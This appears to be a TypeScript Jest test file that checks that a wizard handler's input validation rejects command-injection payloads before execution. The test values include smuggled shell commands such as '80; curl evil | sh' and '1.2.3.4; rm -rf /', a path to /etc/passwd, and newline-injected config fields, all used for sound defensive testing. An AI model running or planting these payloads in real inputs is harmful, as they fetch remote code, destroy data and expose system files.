// src/websocket/__tests__/WizardHandler.injection.test.ts
//
// Proves that command-injection payloads reaching the wizard are neutralised by
// strict validation *before* any command is executed. Each malicious value is
// rejected (the handler throws) so execution never happens — no shell, no argv.

import { WizardHandler } from '../WizardHandler';
import { WizardCommand } from '../types';

function cmd(feature: string, action: string, params: Record<string, unknown>): WizardCommand {
  return { id: 'test', type: 'action', feature: feature as any, action, params };
}

describe('WizardHandler — injection payloads are rejected before execution', () => {
  let handler: WizardHandler;

  beforeEach(() => {
    handler = new WizardHandler();
  });

  it('rejects an injected VM name (start_vm)', async () => {
    await expect(handler.handleCommand(cmd('vm', 'start_vm', { vmName: 'Windows; reboot' })))
      .rejects.toThrow('Invalid vmName parameter');
  });

  it('rejects an option-like VM name (force_stop_vm)', async () => {
    await expect(handler.handleCommand(cmd('vm', 'force_stop_vm', { vmName: '--all' })))
      .rejects.toThrow('Invalid vmName parameter');
  });

  it('rejects an injected firewall zone (add_port)', async () => {
    await expect(handler.handleCommand(cmd('firewall', 'add_port', { port: '80', zone: 'public; reboot' })))
      .rejects.toThrow('Invalid zone parameter');
  });

  it('rejects an injected port (add_port)', async () => {
    await expect(handler.handleCommand(cmd('firewall', 'add_port', { port: '80; curl evil | sh', zone: 'public' })))
      .rejects.toThrow('Invalid port parameter');
  });

  it('rejects an injected forward destination address (add_forward)', async () => {
    await expect(handler.handleCommand(cmd('firewall', 'add_forward', {
      port: '80', toPort: '80', protocol: 'tcp', zone: 'public', toAddr: '1.2.3.4; rm -rf /',
    }))).rejects.toThrow('Invalid toAddr parameter');
  });

  it('rejects an injected interface name (set_interface_zone)', async () => {
    await expect(handler.handleCommand(cmd('network', 'set_interface_zone', {
      interface: 'eth0; reboot', zone: 'public',
    }))).rejects.toThrow('Invalid interface parameter');
  });

  it('rejects an arbitrary configPath outside the allow-list (delete_network)', async () => {
    await expect(handler.handleCommand(cmd('wifi', 'delete_network', { configPath: '/etc/passwd' })))
      .rejects.toThrow('Invalid configPath parameter');
  });

  it('rejects a newline-injected SSID (add_network)', async () => {
    await expect(handler.handleCommand(cmd('wifi', 'add_network', {
      ssid: 'evil\ninterface=wlan9', password: 'password123',
    }))).rejects.toThrow('Invalid characters in ssid or password');
  });

  it('rejects newline-injected PPPoE credentials (set_credentials)', async () => {
    await expect(handler.handleCommand(cmd('pppoe', 'set_credentials', {
      username: 'user\npassword=leak', password: 'secret',
    }))).rejects.toThrow('Invalid characters in username or password');
  });

  it('still routes a harmless command that needs no execution (wizard get_state)', async () => {
    const state = await handler.handleCommand(cmd('wizard', 'get_state', {})) as any;
    expect(state).toHaveProperty('steps');
    expect(Array.isArray(state.steps)).toBe(true);
  });
});
